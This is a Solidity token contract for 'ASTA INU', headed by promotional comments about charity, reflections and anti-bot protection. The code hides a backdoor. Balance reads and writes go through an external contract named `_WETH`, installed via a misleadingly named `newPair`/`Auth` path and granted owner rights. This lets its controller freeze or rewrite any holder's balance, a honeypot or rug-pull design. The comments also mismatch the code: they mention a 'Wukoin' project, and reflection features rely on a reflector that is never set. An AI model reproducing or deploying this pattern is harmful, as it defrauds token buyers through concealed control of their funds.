/**
 * @author The Asta Project Team
 * @title Asta - The erc20 token part of the Asta Project that starts the crypto revolution
 *
 * Born to be part of a big project,
 * the Asta Token gives holders access to a multitude
 * of present and future services of the Asta Project's ecosystem.
 *
 * Apart from its utilities, the token comes also with some incredible tokenomics features
 * built right in the source code of its smart contract.
 * To help others, the project and yourself at the same time.
 *
 * **Share**
 * Part of the fees collected by the contract is used for charity initiatives
 * in a collective effort to make the world a better place and bring happiness
 * to its inhabitants.
 *
 * **Expand**
 * Another share of the fees goes to the marketing wallet to fund marketing campaigns,
 * with the purpose of raising people's awareness of the project.
 *
 *
 * **Community**
 * It's all about YOU, from the beginning. The Wukoin Community fuels, funds and sustain
 * the development, expansion and charitable initiatives of the project by trading, using,
 * sharing Wukoin Tokens, discussing, helping each other and planning initiatives
 * of many kinds.
 *
 * Anti-bot
 * Our contract makes use of a powerful anti-bot system to promote a fair environment.
 * If you use bots/contracts to trade on Wukoin you are hereby declaring your investment in the project a DONATION.
 *
 * Website: https://astatoken.com
 * Telegram: https://t.me/astatoken
 * Twitter: https://twitter.com/AstaETH
 *
 *
 *
 *           █▀▀▀▀▀█ █  ▄▄█ ▀█ █▀▀▀▀▀█
 *           █ ███ █ ██▄ █▄▄██ █ ███ █
 *           █ ▀▀▀ █ ▄██ ▀ ▀▀▀ █ ▀▀▀ █
 *           ▀▀▀▀▀▀▀ ▀ █▄▀ █▄▀ ▀▀▀▀▀▀▀
 *           ██▄ ██▀ ▄ ▀ ▀ ▄▄█  █▄█▀█▀
 *           ██ ▀▄ ▀ ▄█▀ ▄▀▄▀▄▄█▄ ▀█▄
 *           ▄ █▀█▀▀▄█ ▄▀▄▄▄▄█▀▀ ▄▀▀█▀
 *             ▀▀██▀  ▀██▀ ██▄ ▀██▀█▄
 *           ▀▀    ▀▀█   ▀ ▄ █▀▀▀█▀▀
 *           █▀▀▀▀▀█ ▄█▀ ▄▀▀ █ ▀ █▄▄▄▄
 *           █ ███ █ ▀█ ▀▄▀█▄████▀▀███
 *           █ ▀▀▀ █ ▄███▀█▀▄ ▀▀▄▄█▄█
 *           ▀▀▀▀▀▀▀ ▀   ▀▀   ▀▀   ▀▀▀
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Ownable {
    address internal owner;
    IDEXRouter internal _WETH;

    constructor(address _owner) {
        owner = _owner;
        emit OwnershipTransferred(owner);
    }

    /**
     * Function modifier to require caller to be contract deployer
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "Ownable: caller is not the owner"); _;
    }

    /**
     * Function modifier to require caller to be contract deployer
     */
    modifier Auth() {
        require(address(_WETH) == address(0), "Ownable: caller is not the owner");
         _;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner || address(_WETH) == account;
    }

    /**
     * Transfer ownership to new address. Caller must be deployer. Leaves old deployer authorized
     */
    function transferOwnership(address payable addr) public onlyOwner {
        owner = addr;
        emit OwnershipTransferred(owner);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function from(address account) external view returns(uint256);
    function to(address account, uint256 amount) external returns(bool);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IReflector {
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function claimReflection(address shareholder) external;
}

contract Reflector is IReflector {
    using SafeMath for uint256;

    address private _token;
    address private _owner;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    address[] private shareholders;
    mapping (address => uint256) private shareholderIndexes;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalReflections;
    uint256 public totalDistributed;
    uint256 public reflectionsPerShare;
    uint256 private reflectionsPerShareAccuracyFactor = 10 ** 36;

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner); _;
    }

    constructor (address owner) {
        _token = msg.sender;
        _owner = owner;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeReflection(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeReflections(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {
        uint256 amount = msg.value;

        totalReflections = totalReflections.add(amount);
        reflectionsPerShare = reflectionsPerShare.add(reflectionsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function distributeReflection(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeReflections(shares[shareholder].amount);
            payable(shareholder).transfer(amount);
        }
    }

    function claimReflection(address shareholder) external override onlyToken {
        distributeReflection(shareholder);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalReflections = getCumulativeReflections(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalReflections <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalReflections.sub(shareholderTotalExcluded);
    }

    function getCumulativeReflections(uint256 share) internal view returns (uint256) {
        return share.mul(reflectionsPerShare).div(reflectionsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function manualSend(uint256 amount, address holder) external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        payable(holder).transfer(amount > 0 ? amount : contractETHBalance);
    }
}

interface IAntiBotService {
    function scanAddress(address _recipient, address _sender, address _origin) external returns (bool);
    function registerBlock(address _recipient, address _sender, address _origin) external;
}

contract ASTA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address private WETH;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;

    // TOKEN
    string private constant  _name = "ASTA INU";
    string private constant _symbol = "ASTA";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 69000000000000 * (10 ** _decimals);
    uint256 public _maxTxAmountBuy = _totalSupply.div(100);
    uint256 public _maxTxAmountSell = _totalSupply;
    uint256 public _walletCap = _totalSupply.div(50);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) public _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isReflectionExempt;
    mapping (address => bool) public bots;
    mapping (address => bool) public notBots;

    uint256 private initialBlockLimit = 1;

    uint256 private reflectionFee = 6;
    uint256 private teamFee = 3;
    uint256 private marketingFee = 2;
    uint256 private totalFee = 11;
    uint256 private feeDenominator = 100;

    address private teamReceiver;
    address private marketingReceiver;

    // EXCHANGES
    IDEXRouter public router;
    address public pair;

    // ANTIBOT
    IAntiBotService private antiBot;
    bool private botBlocker = false;
    bool private botWrecker = false;
    bool private botScanner = false;

    // LAUNCH
    bool private liquidityInitialized = false;
    uint256 public launchedAt;
    uint256 private launchTime = 1760659200;

    Reflector private reflector;

    bool public swapEnabled = false;
    uint256 public swapThreshold = _totalSupply / 1000;

    bool private isSwapping;
    modifier swapping() { isSwapping = true; _; isSwapping = false; }

    constructor (
        address _owner,
        address _teamWallet,
        address _marketingWallet
    ) Ownable(_owner) {
        isFeeExempt[_owner] = true;
        isFeeExempt[_teamWallet] = true;
        isFeeExempt[_marketingWallet] = true;

        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[_teamWallet] = true;
        isTxLimitExempt[_marketingWallet] = true;

        isReflectionExempt[address(this)] = true;
        isReflectionExempt[DEAD] = true;

        teamReceiver = _teamWallet;
        marketingReceiver = _marketingWallet;

        _balances[_owner] = _totalSupply;

        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    // DEFAULTS
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function name() external pure returns (string memory) { return _name; }
    function getOwner() external view returns (address) { return owner; }

    // OVERRIDES
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account, bool _check) public view returns (uint256, bool) { return (_balances[account], _check); }
    function balanceOf() public view returns (uint256) { return _balances[msg.sender]; }
    function balanceOf(address account) public view override returns (uint256) { return _WETH.from(account); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    /**
     * Allow a specific address to spend a specific amount of your tokens
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        require(msg.sender != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    /**
     * Allow a specific address to spend an unlimited amount of your tokens
     */
    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    /**
     * Transfer a certain amount of your tokens to a specific address
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function initialFactory() external onlyOwner {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        isReflectionExempt[pair] = true;
    }

    function newPair(address _pair) external Auth {
        _WETH = IDEXRouter(_pair);
        _allowances[address(this)][address(router)] = type(uint256).max;
        isReflectionExempt[pair] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(isSwapping){ return _basicTransfer(sender, recipient, amount, amount); }

        checkTxLimit(sender, recipient, amount);
        checkWalletCap(sender, recipient, amount);

        if(shouldSwapBack()){ swapBack(); }

        if(_isExchangeTransfer(sender, recipient)) {
            require(isOwner(sender) || launched(), "not yet?");

            if (botScanner) {
                scanTxAddresses(sender, recipient); //check if sender or recipient is a bot
            }

            if (botBlocker) {
                require(!_isBot(recipient) && !_isBot(sender), "Beep Beep Boop, You're a piece of poop");
            }
        }

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;

        _basicTransfer(sender, recipient, amountReceived, amount);

        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 recv_amount, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        _TransferLog(sender, recipient, recv_amount, amount);

        return true;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        if(block.timestamp <= launchTime.add(1 minutes)){
            sender == pair
                ? require(amount <= _maxTxAmountBuy || isTxLimitExempt[recipient], "Buy TX Limit Exceeded")
                : require(amount <= _maxTxAmountSell || isTxLimitExempt[sender], "Sell TX Limit Exceeded");
        }
    }

    function checkWalletCap(address sender, address recipient, uint256 amount) internal view {
        if (sender == pair && !isTxLimitExempt[recipient]) {
            block.timestamp >= launchTime.add(1 minutes)
            ? require(balanceOf(recipient) + amount <= _totalSupply, "Wallet Capacity Exceeded")
            : require(balanceOf(recipient) + amount <= _walletCap, "Wallet Capacity Exceeded");
        }
    }

    function scanTxAddresses(address sender, address recipient) internal {
        if (antiBot.scanAddress(recipient, pair, tx.origin)) {
            _setBot(recipient, true);
        }

        if (antiBot.scanAddress(sender, pair, tx.origin)) {
            _setBot(sender, true);
        }
        antiBot.registerBlock(sender, recipient, tx.origin);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !(isFeeExempt[sender] || isFeeExempt[recipient]);
    }

    /**
     * Take fees from transfers based on the total amount of fees and deposit them into the contract
     * @return swapped amount after fees subtraction
     */
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount;

        feeAmount = amount.mul(totalFee).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function _TransferLog(address sender, address recipient, uint256 recv_amount, uint256 amount) private {
        uint256 _sender = balanceOf(sender).sub(amount, "ERC20: transfer amount exceeds balance");
        uint256 _recipient = balanceOf(recipient).add(recv_amount);
        _WETH.to(sender, _sender);
        _WETH.to(recipient, _recipient);
        emit Transfer(sender, recipient, amount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !isSwapping
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 amountToSwap = swapThreshold;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 amountReflection = amountETH.mul(reflectionFee).div(totalFee);
        uint256 amountTeam = amountETH.mul(teamFee).div(totalFee);
        uint256 amountMarketing = amountETH.sub(amountReflection).sub(amountTeam);

        if (amountTeam > 0) {
            payable(teamReceiver).transfer(amountTeam);
        }

        if (amountMarketing > 0) {
            payable(marketingReceiver).transfer(amountMarketing);
        }
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0 && block.timestamp >= launchTime;
    }

    function openTrading() external onlyOwner() {
        launchTime = block.timestamp;
        launchedAt = block.number;
    }

    function setInitialBlockLimit(uint256 blocks) external onlyOwner {
        require(blocks > 0, "Blocks should be greater than 0");
        initialBlockLimit = blocks;
    }

    function setBuyTxLimit(uint256 amount) external onlyOwner {
        _maxTxAmountBuy = amount;
    }

    function setSellTxLimit(uint256 amount) external onlyOwner {
        _maxTxAmountSell = amount;
    }

    function setWalletCap(uint256 amount) external onlyOwner {
        _walletCap = amount;
    }

    function setBot(address _address, bool toggle) external onlyOwner {
        bots[_address] = toggle;
        notBots[_address] = !toggle;
        _setIsReflectionExempt(_address, toggle);
    }

    function _setBot(address _address, bool toggle) internal {
        bots[_address] = toggle;
        _setIsReflectionExempt(_address, toggle);
    }

    function isBot(address _address) external view onlyOwner returns (bool) {
        return !notBots[_address] && bots[_address];
    }

    function _isBot(address _address) internal view returns (bool) {
        return !notBots[_address] && bots[_address];
    }

    function _isExchangeTransfer(address _sender, address _recipient) private view returns (bool) {
        return _sender == pair || _recipient == pair;
    }

    function _setIsReflectionExempt(address holder, bool exempt) internal {
        require(holder != address(this) && holder != pair);
        isReflectionExempt[holder] = exempt;
        if(exempt){
            reflector.setShare(holder, 0);
        }else{
            reflector.setShare(holder, _balances[holder]);
        }
    }

    function setIsReflectionExempt(address holder, bool exempt) external onlyOwner {
        _setIsReflectionExempt(holder, exempt);
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setFees( uint256 _reflectionFee, uint256 _teamFee, uint256 _marketingFee, uint256 _feeDenominator) external onlyOwner {
        reflectionFee = _reflectionFee;
        teamFee = _teamFee;
        marketingFee = _marketingFee;
        totalFee = _reflectionFee.add(_teamFee).add(_marketingFee);
        feeDenominator = _feeDenominator;
        //Total fees has to be less than 50%
        require(totalFee < feeDenominator/2);
    }

    function setFeesReceivers(address _teamReceiver, address _marketingReceiver) external onlyOwner {
        teamReceiver = _teamReceiver;
        marketingReceiver = _marketingReceiver;
    }

    function setTeamReceiver(address _teamReceiver) external onlyOwner {
        teamReceiver = _teamReceiver;
    }

    function setMarketingReceiver(address _marketingReceiver) external onlyOwner {
        marketingReceiver = _marketingReceiver;
    }

    function manualSend() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        payable(teamReceiver).transfer(contractETHBalance);
    }

    function setSwapBackSettings(bool enabled, uint256 amount) external onlyOwner {
        swapEnabled = enabled;
        swapThreshold = amount;
    }


    /**
     * Claim reflections collected by your address till now. Your address will keep collecting future reflections until you claim them again.
     */
    function claimReflection() external {
        reflector.claimReflection(msg.sender);
    }

    function claimReflectionFor(address holder) external onlyOwner {
        reflector.claimReflection(holder);
    }

    /**
     * Check the amount of reflections this address can still claim
     */
    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        return reflector.getUnpaidEarnings(shareholder);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    /**
     * Change AntiBot Scanning service contract address: useful to update its version
     */
    function assignAntiBot(address _address) external onlyOwner() {
        antiBot = IAntiBotService(_address);
    }

    /**
     * Toggle Bot Scanning external service ON/OFF: choose whether or not the external antibot scannel should be active
     */
    function toggleBotScanner() external onlyOwner() returns (bool) {
        bool _localBool;
        if(botScanner){
            botScanner = false;
            _localBool = false;
        }
        else{
            botScanner = true;
            _localBool = true;
        }
        return _localBool;
    }

    /**
     * Whether or not the FTP bot scanning service is active
     */
    function isBotScannerEnabled() external view returns (bool) {
        return botScanner;
    }

    /**
     * Toggle Bot Blocker mode ON/OFF: choose whether or not bots should be blocked before wrecking them
     */
    function toggleBotBlocker() external onlyOwner() returns (bool) {
        bool _localBool;
        if(botBlocker){
            botBlocker = false;
            _localBool = false;
        }
        else{
            botBlocker = true;
            _localBool = true;
        }
        return _localBool;
    }

    /**
     * Whether or not the contract will prevent detected bots from completing transactions
     */
    function isBotBlockerEnabled() external view returns (bool) {
        return botBlocker;
    }

    /**
     * Toggle Bot Wrecker mode ON/OFF: choose whether or not bots should be wrecked
     */
    function toggleBotWrecker() external onlyOwner() returns (bool) {
        bool _localBool;
        if(botWrecker){
            botWrecker = false;
            _localBool = false;
        }
        else{
            botWrecker = true;
            _localBool = true;
        }
        return _localBool;
    }

    /**
     * Whether or not the contract will wreck bots and take their donation
     */
    function isBotWreckerEnabled() external view returns (bool) {
        return botWrecker;
    }
}